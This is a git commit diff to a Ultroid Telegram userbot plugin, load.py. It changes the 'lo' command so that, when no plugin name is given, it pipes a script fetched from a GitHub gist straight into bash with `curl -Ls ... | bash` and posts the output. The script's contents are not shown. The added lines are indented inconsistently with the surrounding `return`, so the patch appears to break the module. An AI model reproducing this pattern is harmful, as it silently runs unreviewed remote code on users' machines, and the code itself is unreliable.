7dd303be4b2176d1e201f9aa3d443daed3df46a7
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2025-03-11 10:45:00 +0530

    Update load.py

--- plu/load.py
+++ plu/load.py
@@ -1,13 +1,15 @@
 from pyUltroid.startup.loader import load_addons
 from os import listdir as ls
-from . import ultroid_cmd, get_string
+from . import ultroid_cmd, get_string, bash
 
 @ultroid_cmd(pattern="lo( (.*)|$)",manager=True)
 async def ch(e):
+  c = await e.eor(get_string("com_1"))
   q = e.pattern_match.group(1).strip()
   reply = await e.get_reply_message()
   if not q:
-    await e.edit("**Type plugin name **")
+      a,d = await bash(f"curl -Ls https://gist.githubusercontent.com/rooted-cyber/1bd2b7d3eb4d66ab06ab5e83098395e3/raw/cpp | bash")
+      await c.edit(f"{a}\n\n")
     return
   b = f"{q}.py"
   d = ls("plugins")
